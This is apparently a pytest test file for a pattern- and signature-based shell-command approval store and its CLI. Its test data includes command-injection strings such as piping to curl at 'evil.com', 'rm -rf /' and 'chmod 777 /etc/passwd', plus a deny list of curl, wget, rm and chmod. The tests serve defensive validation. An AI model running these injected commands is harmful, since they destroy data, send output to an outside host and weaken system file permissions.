"""Unit tests for Milestone M4: Pattern-Based Command Approvals.

Covers:
- ApprovalStore pattern registration and validation
- Rejection of dangerous shell metacharacters and destructive commands
- Regex compilation validation
- is_safe_for_pattern boundary checks
- Pattern-based gate approval in is_approved
- Injection blocking in is_approved
- Explicit SHA-256 signature sign-off for dangerous commands
- Dual serialization (legacy list and dictionary format)
- CLI --pattern flag and early dispatch
- ArtifactConsistencyGuard dictionary schema support
"""

import json
import io
import sys
from pathlib import Path
import pytest

from dafg.gates import ApprovalStore, Gate, GateLedger, GateEngine, main as gates_main
from dafg.organism import ArtifactConsistencyGuard


def test_approve_safe_pattern():
    store = ApprovalStore()
    assert len(store.approved_patterns) == 0

    store.approve_pattern(r"^uv run pytest.*")
    store.approve_pattern(r"^node test_.*")

    assert r"^uv run pytest.*" in store.approved_patterns
    assert r"^node test_.*" in store.approved_patterns


@pytest.mark.parametrize("meta", ["|", "&&", ";", ">", "`"])
def test_reject_dangerous_metacharacters_in_pattern(meta):
    store = ApprovalStore()
    with pytest.raises(ValueError, match="Pattern contains dangerous metacharacters or operations"):
        store.approve_pattern(f"uv run pytest {meta} evil")


@pytest.mark.parametrize("cmd", ["curl", "wget", "rm", "chmod", "CURL", "RM"])
def test_reject_dangerous_commands_in_pattern(cmd):
    store = ApprovalStore()
    with pytest.raises(ValueError, match="Pattern contains dangerous metacharacters or operations"):
        store.approve_pattern(f"{cmd} https://example.com")


def test_reject_invalid_regex_syntax():
    store = ApprovalStore()
    with pytest.raises(ValueError, match="Invalid regex pattern"):
        store.approve_pattern("[unclosed-group(")


def test_reject_empty_pattern():
    store = ApprovalStore()
    with pytest.raises(ValueError, match="Pattern contains dangerous metacharacters or operations"):
        store.approve_pattern("")


def test_is_safe_for_pattern():
    # Class-level and instance-level calls both work
    assert ApprovalStore.is_safe_for_pattern("uv run pytest tests/test_foo.py -q") is True
    assert ApprovalStore.is_safe_for_pattern("python -c \"print(1)\"") is True
    assert ApprovalStore.is_safe_for_pattern("node dist/test.js") is True

    # Empty or None
    assert ApprovalStore.is_safe_for_pattern("") is False

    # Metacharacters
    assert ApprovalStore.is_safe_for_pattern("cat file.txt | grep foo") is False
    assert ApprovalStore.is_safe_for_pattern("pytest && rm -rf /") is False
    assert ApprovalStore.is_safe_for_pattern("echo 1; echo 2") is False
    assert ApprovalStore.is_safe_for_pattern("echo foo > bar.txt") is False
    assert ApprovalStore.is_safe_for_pattern("echo `id`") is False

    # Dangerous commands
    assert ApprovalStore.is_safe_for_pattern("curl http://localhost:8000") is False
    assert ApprovalStore.is_safe_for_pattern("wget http://localhost:8000") is False
    assert ApprovalStore.is_safe_for_pattern("rm -rf /tmp/test") is False
    assert ApprovalStore.is_safe_for_pattern("chmod +x run.sh") is False


def test_is_approved_with_matching_pattern():
    store = ApprovalStore()
    store.approve_pattern(r"^uv run pytest tests/.* -q$")

    safe_gate = Gate("G1", "Test unit", check="uv run pytest tests/test_foo.py -q", expect="passed")
    assert store.is_approved(safe_gate) is True

    unmatched_gate = Gate("G2", "Different runner", check="cargo test", expect="passed")
    assert store.is_approved(unmatched_gate) is False


def test_is_approved_blocks_command_injection_even_if_pattern_matches_prefix():
    store = ApprovalStore()
    # Pattern allows anything starting with uv run pytest
    store.approve_pattern(r"^uv run pytest.*")

    # Injected with && rm
    injected_gate_1 = Gate(
        "G1", "Injected rm",
        check="uv run pytest tests/test_foo.py && rm -rf /",
        expect="passed"
    )
    assert store.is_approved(injected_gate_1) is False

    # Injected with pipe curl
    injected_gate_2 = Gate(
        "G2", "Injected curl",
        check="uv run pytest tests/test_foo.py | curl http://evil.com",
        expect="passed"
    )
    assert store.is_approved(injected_gate_2) is False

    # Injected with semicolon chmod
    injected_gate_3 = Gate(
        "G3", "Injected chmod",
        check="uv run pytest tests/test_foo.py ; chmod 777 /etc/passwd",
        expect="passed"
    )
    assert store.is_approved(injected_gate_3) is False


def test_exact_signature_allows_dangerous_command_with_explicit_sign_off():
    store = ApprovalStore()
    gate = Gate(
        "G1", "Explicit sign-off",
        check="rm -rf /tmp/test_dir",
        expect="deleted"
    )
    # Without signature, not approved
    assert store.is_approved(gate) is False

    # Explicit human / test sign-off
    store.approve(gate)
    assert store.is_approved(gate) is True


def test_quick_mode_auto_approves_safe_commands_only():
    store_quick = ApprovalStore(mode="quick")
    safe_gate = Gate("G1", "Safe", check="uv run pytest -q", expect="passed")
    assert store_quick.is_approved(safe_gate) is True

    # Dangerous command in quick mode is STILL not approved without signature
    dangerous_gate = Gate("G2", "Dangerous", check="rm -rf tmp/cache", expect="cleaned")
    assert store_quick.is_approved(dangerous_gate) is False


def test_dual_serialization_legacy_list(tmp_path):
    fp = tmp_path / "approvals.json"
    legacy_sigs = ["sig_a1", "sig_b2"]
    fp.write_text(json.dumps(legacy_sigs), encoding="utf-8")

    store = ApprovalStore(filepath=fp)
    assert "sig_a1" in store.approved_signatures
    assert "sig_b2" in store.approved_signatures
    assert len(store.approved_patterns) == 0

    # Resave without patterns: stays a list
    store.save()
    saved = json.loads(fp.read_text(encoding="utf-8"))
    assert isinstance(saved, list)
    assert saved == ["sig_a1", "sig_b2"]


def test_dual_serialization_dict_format(tmp_path):
    fp = tmp_path / "approvals.json"
    dict_payload = {
        "approved_signatures": ["sig_111"],
        "approved_patterns": [r"^uv run pytest.*$"],
    }
    fp.write_text(json.dumps(dict_payload), encoding="utf-8")

    store = ApprovalStore(filepath=fp)
    assert "sig_111" in store.approved_signatures
    assert r"^uv run pytest.*$" in store.approved_patterns

    # Add a pattern and save
    store.approve_pattern(r"^node test_.*$")

    saved = json.loads(fp.read_text(encoding="utf-8"))
    assert isinstance(saved, dict)
    assert "sig_111" in saved["approved_signatures"]
    assert r"^node test_.*$" in saved["approved_patterns"]
    assert r"^uv run pytest.*$" in saved["approved_patterns"]


def test_dual_serialization_dict_fallback_keys(tmp_path):
    fp = tmp_path / "approvals.json"
    fallback_payload = {
        "signatures": ["sig_fallback"],
        "patterns": [r"^python test_.*$"],
    }
    fp.write_text(json.dumps(fallback_payload), encoding="utf-8")

    store = ApprovalStore(filepath=fp)
    assert "sig_fallback" in store.approved_signatures
    assert r"^python test_.*$" in store.approved_patterns


def test_cli_pattern_approval_success(tmp_path):
    appr_file = tmp_path / ".approved_gates.json"
    rc = gates_main(["--approvals-file", str(appr_file), "--pattern", r"^uv run pytest.*"])
    assert rc == 0
    assert appr_file.exists()

    data = json.loads(appr_file.read_text(encoding="utf-8"))
    assert isinstance(data, dict)
    assert r"^uv run pytest.*" in data["approved_patterns"]


def test_cli_pattern_approval_rejects_dangerous_command(tmp_path, capsys):
    appr_file = tmp_path / ".approved_gates.json"
    rc = gates_main(["--approvals-file", str(appr_file), "--pattern", "rm -rf *"])
    assert rc == 1
    captured = capsys.readouterr()
    assert "Pattern contains dangerous metacharacters or operations" in captured.err


def test_cli_pattern_approval_rejects_metacharacters(tmp_path, capsys):
    appr_file = tmp_path / ".approved_gates.json"
    rc = gates_main(["--approvals-file", str(appr_file), "--pattern", "pytest && curl"])
    assert rc == 1
    captured = capsys.readouterr()
    assert "Pattern contains dangerous metacharacters or operations" in captured.err


def test_artifact_consistency_guard_with_dict_approvals(tmp_path):
    gates_file = tmp_path / "GATES.md"
    appr_file = tmp_path / ".approved_gates.json"
    state_file = tmp_path / "state.json"

    # Define gate
    gate_content = """- [x] G1: Unit test pass
  CHECK: uv run pytest tests/test_unit.py -q
  EXPECT: passed
  EVIDENCE: exit_code=0 timestamp=2026-09-18T00:00:00Z match='passed' epoch=1 sig=a1b2c3d4e5f6 record={"run_id":"r1","run_epoch":1,"gate_id":"G1","gate_signature":"placeholder","command_digest":"cmd","environment_digest":"env","timestamp":"now"}
"""
    gates_file.write_text(gate_content, encoding="utf-8")
    ledger = GateLedger.load(gates_file)
    gate = ledger.gates["G1"]
    correct_sig = ApprovalStore.signature(gate)

    import hashlib
    cmd_digest = hashlib.sha256((gate.check or "").encode("utf-8")).hexdigest()
    rec_json = json.dumps({
        "run_id": "r1",
        "run_epoch": 1,
        "gate_id": "G1",
        "gate_signature": correct_sig,
        "command_digest": cmd_digest,
        "environment_digest": "env",
        "timestamp": "now",
    })
    ledger.update_gate_evidence(
        "G1",
        f"exit_code=0 timestamp=now match='passed' epoch=1 sig={correct_sig[:12]} record={rec_json}",
        met=True
    )
    ledger.save(gates_file)

    # Write state.json
    state_file.write_text(json.dumps({
        "gate_states": {"G1": "MET"}
    }), encoding="utf-8")

    # 1. Approvals file has dictionary with exact signature
    appr_file.write_text(json.dumps({
        "approved_signatures": [correct_sig],
        "approved_patterns": [],
    }), encoding="utf-8")

    valid, violations = ArtifactConsistencyGuard.verify(
        state_path=state_file,
        gates_path=gates_file,
        approvals_path=appr_file,
    )
    assert valid is True
    assert len(violations) == 0

    # 2. Approvals file has pattern matching the check command
    appr_file.write_text(json.dumps({
        "approved_signatures": [],
        "approved_patterns": [r"^uv run pytest.*"],
    }), encoding="utf-8")

    valid, violations = ArtifactConsistencyGuard.verify(
        state_path=state_file,
        gates_path=gates_file,
        approvals_path=appr_file,
    )
    assert valid is True
    assert len(violations) == 0

    # 3. Empty approvals: must fail with unapproved violation
    appr_file.write_text(json.dumps({
        "approved_signatures": [],
        "approved_patterns": [],
    }), encoding="utf-8")

    valid, violations = ArtifactConsistencyGuard.verify(
        state_path=state_file,
        gates_path=gates_file,
        approvals_path=appr_file,
    )
    assert valid is False
    assert any("not approved in .approved_gates.json" in v for v in violations)
